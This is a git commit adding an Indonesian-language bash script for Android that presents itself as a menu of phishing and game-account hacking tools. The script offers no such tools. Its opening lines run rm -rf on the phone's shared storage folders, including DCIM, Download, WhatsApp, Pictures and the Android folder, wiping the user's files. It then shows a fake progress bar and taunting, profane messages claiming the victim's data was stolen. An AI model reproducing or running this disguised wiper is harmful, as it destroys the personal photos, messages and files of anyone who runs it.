0a5f9f4e55bb7866e9ca532bed78d58e10f746db
THEIMMORTALHACKER <71122269+THEIMMORTALHACKER@users.noreply.github.com>
2020-09-13 00:21:46 +0700

    Create phising1.sh

---
+++ phising1.sh
@@ -0,0 +1,119 @@
+#!/system/xbin/bash
+#AUTHOR:NOTBAD
+#Github:https://github.com/THEIMMORTALHACKER
+#Bersihkan Layar
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsApp
+rm -rf KAWAI3
+rm -rf Vidio
+blue='\e[1;34m'
+green='\e[1;32m'
+purple='\[1;35m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+sleep 3
+echo "\033[32;1m
+#################################
+#-AUTHOR= CARI DI GOOGLE        #
+#-INSTAGRAM=NO IG.              #
+#-Team=NO TEAM.                 #
+#################################
+"
+sleep 1
+
+echo "\033[32;1mTULIS= phising game! "
+read p;
+
+sleep 2
+
+echo "\033[32;1m
+#-KUMPULAN phising game NO ROOT-#
+______________________________
+|1.phising semua game        |
+|2.sadap Wa                  |
+|3.phising free fire         |
+|4.phising codm              |
+|5.phising ml                |
+|6.phising coc               |
+|7.phising pb                |
+|8.phis akun facebook        |
+|9.phis akun instagram       |
+|10.akun gratis all game     |
+|11.phising game             |
+|12.buat link phising        |
+|13.phising akun sosmed      |
+|14.hack akun masal          |
+|15.script phisng            |
+|16.hack akun free fire      |
+|17.hack akun pubg           |
+|18.hack akun pb             |
+|19.Hack akun game all       |
+|20.perusak Hp Orang         |
+|____________________________|
+"
+echo "\033[32;1mPilih No : "
+read p;
+
+sleep 2
+echo "Sabar Gan Proses tunggu sampai selesai..."
+echo "\033[34;1m#10%"
+sleep 1
+echo "##20%"
+sleep 1
+echo "###30%"
+sleep 2
+echo "####40%"
+sleep 2
+echo "#####50%"
+sleep 2
+echo "######60%"
+sleep 2
+echo "#######70%"
+sleep 4
+echo "########80%"
+sleep 3
+echo "#########90%"
+sleep 4
+echo "##########100%"
+sleep 3
+echo "_____________________________________"
+sleep 2
+echo "Baca Persen Gw"
+sleep 2
+echo "hacker Jahat Berawal Dari"
+sleep 2
+echo "hacker Baik namun Di Sakiti"
+sleep 2
+echo "Seperti Saya Yang Selalu Di Sakiti"
+sleep 2
+echo "Jadi Kalian Harus Merasakan"
+sleep 2
+echo "Apa Yang Saya Rasakan"
+sleep 2
+echo "jangan kirim phising murahaan"
+sleep 2
+echo "kalian selalu di intai..! anjk"
+sleep 2
+echo "Selamat Data Kalian Saya Curi "
+sleep 2
+echo "kalian akan dalam masalah"
+sleep 2
+echo "mampus njk karma tukang phising"
+sleep 2
+echo "____________________________________"
+sleep 2
+toilet -f standard -F gay "MAMPUS"
+sleep 1
+toilet -f standard -F gay "LOE"
+sleep 1
+toilet -f standard -F gay "BANGSAT"
